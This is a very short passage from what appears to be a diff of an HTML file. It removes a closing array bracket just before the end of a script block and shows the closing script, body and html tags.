-];
-
 </script>
-
 </body>
 </html>
